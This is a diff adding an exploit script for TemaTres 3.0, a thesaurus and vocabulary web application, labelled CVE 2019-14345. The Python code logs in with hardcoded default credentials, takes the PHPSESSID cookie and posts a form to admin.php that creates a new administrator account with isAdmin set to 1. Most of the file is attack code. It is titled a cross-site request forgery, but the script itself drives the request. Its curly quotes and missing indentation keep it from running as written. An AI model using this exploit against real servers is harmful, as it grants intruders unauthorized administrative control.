@@ -1,0 +1,74 @@
+# Exploit Title: TemaTres 3.0 — Cross-Site Request Forgery (Add Admin)
+# Author: Pablo Santiago
+# Date: 2019-11-14
+# Vendor Homepage: https://www.vocabularyserver.com/
+# Source: https://sourceforge.net/projects/tematres/files/TemaTres%203.0/tematres3.0.zip/download
+# Version: 3.0
+# CVE : 2019–14345
+# Reference:https://medium.com/@Pablo0xSantiago/cve-2019-14345-ff6f6d9fd30f
+# Tested on: Windows 10
+
+# Description:
+# Web application for management formal representations of knowledge,
+# thesauri, taxonomies and multilingual vocabularies / Aplicación para
+# la gestión de representaciones formales del conocimiento, tesauros,
+# taxonomías, vocabularios multilingües.
+
+#Exploit
+
+import requests
+import sys
+
+session = requests.Session()
+
+http_proxy = “http://127.0.0.1:8080"
+https_proxy = “https://127.0.0.1:8080"
+
+proxyDict = {
+“http” : http_proxy,
+“https” : https_proxy
+}
+
+url = ‘http://localhost/tematres/vocab/login.php'
+values = {‘id_correo_electronico’: ‘pablo@tematres.com’,
+‘id_password’: ‘admin’,
+‘task’:’login’}
+
+r = session.post(url, data=values, proxies=proxyDict)
+cookie = session.cookies.get_dict()[‘PHPSESSID’]
+
+print (cookie)
+
+host = sys.argv[1]
+user = input(‘[+]User:’)
+lastname = input(‘[+]lastname:’)
+password = input(‘[+]Password:’)
+password2 = input(‘[+]Confirm Password:’)
+email = input(‘[+]Email:’)
+
+if (password == password2):
+#configure proxy burp
+
+data = {
+‘_nombre’:user,
+‘_apellido’:lastname,
+‘_correo_electronico’:email,
+‘orga’:’bypassed’,
+‘_clave’:password,
+‘_confirmar_clave’:password2,
+‘isAdmin’:1,
+‘boton’:’Guardar’,
+‘userTask’:’A’,
+‘useactua’:’’
+
+}
+headers= {
+‘Cookie’: ‘PHPSESSID=’+cookie
+}
+request = session.post(host+’/tematres/vocab/admin.php’, data=data,
+headers=headers, proxies=proxyDict)
+print(‘+ — — — — — — — — — — — — — — — — — — — — — — — — — +’)
+print(‘Status Code:’+ str(request.status_code))
+
+else:
+print (‘Passwords dont match!!!’)
